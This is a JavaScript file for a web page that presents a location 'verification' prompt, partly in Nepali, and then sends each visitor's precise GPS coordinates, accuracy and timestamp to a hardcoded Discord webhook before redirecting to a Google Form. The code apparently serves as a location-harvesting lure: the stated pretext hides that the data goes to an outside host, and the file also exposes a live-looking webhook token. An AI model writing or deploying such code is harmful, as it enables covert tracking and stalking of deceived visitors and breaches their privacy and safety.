document.addEventListener("DOMContentLoaded", () => {
  const allowBtn = document.getElementById("allow-btn");
  const statusMsg = document.getElementById("status-message");
  const modal = document.getElementById("location-modal");

  const webhookURL = "https://discord.com/api/webhooks/1383281092777480313/Zh_MyM1ljMmc0PFZMskyV8fclEkARhghn8tuvhi0knMZttDD2C__ASn3XeopZ9yyGgBd"; // Replace with your webhook

  function sendToDiscord(latitude, longitude, accuracy, timestamp) {
    const readableTime = new Date(timestamp).toLocaleString();

    const message = `📍 **New visitor location**:
- 🌍 Latitude: \`${latitude}\`
- 🌍 Longitude: \`${longitude}\`
- 🎯 Accuracy: \`${accuracy} meters\`
- 🕒 Timestamp: \`${readableTime}\``;

    const payload = {
      content: message
    };

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    })
    .then(() => {
      statusMsg.textContent = "Redirecting...";
      setTimeout(() => {
        window.location.href = "https://forms.gle/JAM6tU6od5x4x4mf8";
      }, 1000);
    })
    .catch((err) => {
      statusMsg.textContent = "Failed to send location.";
      console.error("Webhook error:", err);
    });
  }

  function requestLocation() {
    statusMsg.textContent = "Requesting location...";

    if (!navigator.geolocation) {
      statusMsg.textContent = "Geolocation not supported by this browser.";
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const timestamp = position.timestamp;

        sendToDiscord(latitude, longitude, accuracy, timestamp);
      },
      (error) => {
        statusMsg.textContent = "कृपया आफ्नो Location Verify गर्नुहोस्.";
        allowBtn.disabled = false;
        allowBtn.textContent = "Try Again";
        console.warn("Location error:", error.message);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0
      }
    );
  }

  allowBtn.addEventListener("click", () => {
    allowBtn.disabled = true;
    allowBtn.textContent = "Please wait...";
    requestLocation();
  });
});
